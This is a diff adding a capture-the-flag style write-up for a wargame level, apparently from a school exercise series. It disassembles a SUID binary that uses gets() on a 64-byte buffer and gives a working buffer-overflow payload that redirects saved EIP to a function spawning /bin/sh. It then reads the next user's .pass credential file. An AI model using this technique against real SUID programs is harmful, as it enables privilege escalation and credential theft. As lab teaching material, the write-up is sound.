@@ -1,0 +1,45 @@
+ls -l level1
+
+-rwsr-s---+ 1 level2 users 5138 Mar  6  2016 level1
+
+We can see that the binary has the SUID (Set User ID) bit set and is owned by level2.
+
+gdb ./level1
+
+info functions shows us two interesting functions : main and run
+
+(gdb) set disassembly-flavor intel
+
+Then :
+(gdb) disassemble main
+(gdb) disassemble run
+
+See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.
+
+The ASM analysis shows that the program essentially behaves like this:
+
+void run(void)
+{
+    fwrite("Good... Wait what?\n", 1, 19, stdout);
+    system("/bin/sh");
+}
+
+int main(void)
+{
+    char buffer[64];
+
+    gets(buffer);
+
+    return 0;
+}
+
+We notice the usage of the gets function.
+This function is deprecated because it doesn't check the input size.
+We can overflow the buffer to corrupt the stack.
+We will use this method to change the value of the address of saved EIP (Extended Instruction Pointer) to make it point toward the run() function
+
+python -c 'print "0"*76+"\x44\x84\x04\x08"' > /tmp/payload (explanation of the payload buffer size and value can be found in Ressources/asm_analysis.md)
+cat /tmp/payload - | ./level1
+cat /home/user/level2/.pass
+
+#Note : We need to use cat with - so that the interactive shell launched in the run() function doesn't receive EOF and close instantly.
